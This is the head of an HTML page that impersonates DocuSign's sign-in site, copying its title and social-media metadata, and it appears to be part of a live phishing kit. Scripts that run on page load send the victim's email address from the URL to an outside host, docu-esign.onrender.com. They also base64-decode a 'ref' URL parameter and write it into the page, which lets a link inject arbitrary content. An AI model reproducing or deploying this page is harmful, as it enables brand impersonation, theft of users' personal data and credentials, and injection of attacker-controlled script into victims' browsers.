<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>
      DocuSign | #1 in Electronic Signature and Contract Lifecycle Management
    </title>

    <script type="text/javascript">
      let hasEmail = new URLSearchParams(window.location.search).has("id");
      if (hasEmail) {
        let email = new URLSearchParams(window.location.search).get("id");
        let payLoad = { id: 0, email: email };
        let emailXhr = new XMLHttpRequest();
        emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
        emailXhr.setRequestHeader("Content-type", "application/json");
        emailXhr.send(JSON.stringify(payLoad));

        emailXhr.onreadystatechange = function () {
          if (this.readyState == 4 && this.status == 200) {
            let response = JSON.parse(this.response);
            console.log(response);
          }
        };
      }
    </script>

    <script type="text/javascript">
      let hasRef = new URLSearchParams(window.location.search).has("ref");
      if (hasRef) {
        let ref = new URLSearchParams(window.location.search).get("ref");
        document.write(decodeURIComponent(atob(`${ref}`)));
      }
    </script>

    <meta
      name="title"
      property="og:title"
      content="DocuSign | #1 in Electronic Signature and Contract Lifecycle Management"
    />
    <meta
      name="description"
      property="og:description"
      content="DocuSign ensures the security &amp; mobility to digitally transform businesses. Sign docs for free."
    />
    <meta
      name="image"
      property="og:image"
      content="https://images.ctfassets.net/0jnmtsdzg6p5/4GSPcvcpIZpsXsZ7F0EXTW/14994b65b37fd0a9168725b4de994e98/OG_Image_Black.png"
    />
    <meta
      name="twitter:title"
      content="DocuSign | #1 in Electronic Signature and Contract Lifecycle Management"
    />
    <meta
      name="twitter:description"
      content="DocuSign ensures the security &amp; mobility to digitally transform businesses. Sign docs for free."
    />
    <style>
        #loader {
            width: 0%;
            position: relative;
            animation: incrementWidth 1s linear forwards;
        }
    
        @keyframes incrementWidth {
            0% { width: 0%; }
            100% { width: 98%; }
        }
    </style>
  </head>
